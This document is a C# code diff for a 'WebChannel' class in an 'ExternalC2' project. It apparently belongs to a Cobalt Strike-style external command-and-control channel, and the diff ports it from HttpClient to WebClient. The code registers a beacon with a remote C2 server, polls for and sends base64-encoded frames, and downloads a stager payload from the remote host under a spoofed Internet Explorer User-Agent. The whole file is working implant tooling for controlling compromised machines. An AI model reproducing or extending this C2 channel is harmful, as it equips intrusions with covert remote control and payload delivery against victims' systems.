@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Linq;
-using System.Net.Http;
+using System.Net;
+using System.Text;
 using System.Threading;
 using ExternalC2.Interfaces;
 
@@ -11,7 +12,7 @@ namespace ExternalC2.Channels
     /// </summary>
     public class WebChannel : IC2Channel
     {
-        private readonly HttpClient _client;
+        private readonly WebClient _client;
         private readonly Uri _uri;
 
         /// <summary>
@@ -21,7 +22,7 @@ namespace ExternalC2.Channels
         public WebChannel(string url)
         {
             _uri = new Uri(url);
-            _client = new HttpClient {BaseAddress = _uri};
+            _client = new WebClient {BaseAddress = url};
         }
 
         /// <summary>
@@ -48,17 +49,16 @@ namespace ExternalC2.Channels
             // TODO: A more elaborate connect and configuration procedure
             UrlPath = _uri.AbsolutePath;
 
-            var connectReq = new HttpRequestMessage(HttpMethod.Options, UrlPath);
-            var connectResp = _client.SendAsync(connectReq).Result;
+            _client.UploadString(UrlPath, "OPTIONS", "");
 
             // Example of configuring the client
-            var idHeader = connectResp.Headers.GetValues("X-Id-Header").FirstOrDefault();
-            var beaconId = connectResp.Headers.GetValues("X-Identifier").FirstOrDefault();
+            var idHeader = _client.ResponseHeaders.GetValues("X-Id-Header").FirstOrDefault();
+            var beaconId = _client.ResponseHeaders.GetValues("X-Identifier").FirstOrDefault();
 
             if (beaconId != null)
             {
-                BeaconId = Guid.Parse(beaconId);
-                _client.DefaultRequestHeaders.Add(idHeader, BeaconId.ToString());
+                BeaconId = new Guid(beaconId);
+                _client.Headers.Add(idHeader, BeaconId.ToString());
                 Connected = true;
             }
             else
@@ -94,7 +94,7 @@ namespace ExternalC2.Channels
             string b64Str;
             while (true) // TODO: Add failure condition
             {
-                b64Str = _client.GetStringAsync(UrlPath).Result;
+                b64Str = _client.DownloadString(UrlPath);
                 if (!string.IsNullOrEmpty(b64Str)) break;
                 Thread.Sleep(1000);
             }
@@ -108,8 +108,7 @@ namespace ExternalC2.Channels
         /// <param name="buffer"></param>
         public void SendFrame(byte[] buffer)
         {
-            var body = new StringContent(Convert.ToBase64String(buffer));
-            _client.PutAsync(UrlPath, body).Wait();
+            _client.UploadString(UrlPath, "PUT", Convert.ToBase64String(buffer));
         }
 
         /// <summary>
@@ -147,13 +146,13 @@ namespace ExternalC2.Channels
         public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
         {
             var bits = is64Bit ? "x64" : "x86";
-            _client.DefaultRequestHeaders.Add("User-Agent",
+            _client.Headers.Add("User-Agent",
                 $"Mozilla/5.0 (Windows NT 10.0; {bits}; Trident/7.0; rv:11.0) like Gecko");
 
-            var resp = _client.PostAsync(UrlPath, null).Result;
-            var stager = resp.Content.ReadAsStringAsync().Result;
+            var resp = _client.UploadData(UrlPath, new byte[] { });
+            var b64Str = Encoding.Default.GetString(resp);
 
-            return Convert.FromBase64String(stager);
+            return Convert.FromBase64String(b64Str);
         }
     }
 }
